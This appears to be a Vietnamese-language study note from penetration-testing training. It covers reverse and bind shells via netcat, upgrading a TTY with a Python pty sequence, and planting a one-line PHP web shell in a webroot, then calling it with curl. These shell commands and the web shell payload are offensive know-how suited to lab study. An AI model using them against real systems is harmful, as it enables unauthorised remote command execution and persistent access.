# ////////// Types of Shells //////////

## #### Reverse Shell
**Lệnh thực thi:** `nc -lvnp 1234` : mở port nghe

* **-l**: Chế độ nghe (Listen), để chờ kết nối kết nối với chúng tôi.
* **-v**: Chế độ Verbose, để chúng ta biết khi nào chúng ta nhận được kết nối.
* **-n**: Vô hiệu hóa độ phân giải DNS và chỉ kết nối từ/đến IP, để tăng tốc độ kết nối.
* **-p 1234**: Số cổng netcat đang nghe và kết nối ngược lại sẽ được gửi tới.

**Tham khảo:** [InternalAllTheThings - Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
-> Tìm lệnh để mở reverse connection --> thành công.
 
> **Lưu ý:** Khi lệnh shell ngược bị dừng hoặc nếu chúng ta mất kết nối vì bất kỳ lý do gì, chúng ta sẽ phải sử dụng cách khai thác ban đầu để thực thi lại lệnh shell ngược để lấy lại quyền truy cập của mình.

---

## #### Bind Shell
**Tham khảo:** [InternalAllTheThings - Bind Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)

1. Tìm lệnh bind shell.
2. Thực thi: `nc 10.10.10.1 1234` --> kết nối thành công.

> **Lưu ý:** Nếu lệnh bind shell bị dừng vì bất kỳ lý do gì hoặc nếu máy chủ từ xa được khởi động lại, sẽ bị mất kết nối.

---

## --- Sau khi connect shell qua Netcat thì cần nâng cấp TTY ---

Thực hiện chuỗi lệnh sau để có shell ổn định hơn:

1. `python -c 'import pty; pty.spawn("/bin/bash")'`
2. Nhấn `Ctrl + Z` (để tạm dừng và đưa vào background)
3. `stty raw -echo`
4. `fg` (nhấn Enter 2 lần)
5. `export TERM=xterm-256color`
6. `stty rows 67 columns 318`

---

## #### Web Shell
Web Shell thực chất là một đoạn mã (script) nhỏ được viết bằng ngôn ngữ lập trình web mà máy chủ đó hỗ trợ (như PHP, ASPX, JSP). Để Web Shell hoạt động, bạn phải đặt được file chứa đoạn mã trên vào **Webroot** - thông qua upload hoặc lệnh của reverse shell.

### Các đường dẫn Webroot phổ biến:
| Server | Đường dẫn mặc định |
| :--- | :--- |
| **Apache** | `/var/www/html/` |
| **Nginx** | `/usr/local/nginx/html/` |
| **IIS** | `C:\inetpub\wwwroot\` |
| **XAMPP** | `C:\xampp\htdocs\` |

### Ví dụ tạo và sử dụng Web Shell (PHP):
* **Tạo file:** `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
* **Sử dụng:** `curl http://SERVER_IP:PORT/shell.php?cmd=id`

> **Đánh giá:**
> * **Ưu điểm:** Vượt tường lửa, bền bỉ, khó bị mất file shell.

> * **Nhược điểm:** Không tương tác trực tiếp được (non-interactive) do shell cố định ở folder đó, dễ để lại dấu vết trong log truy cập.

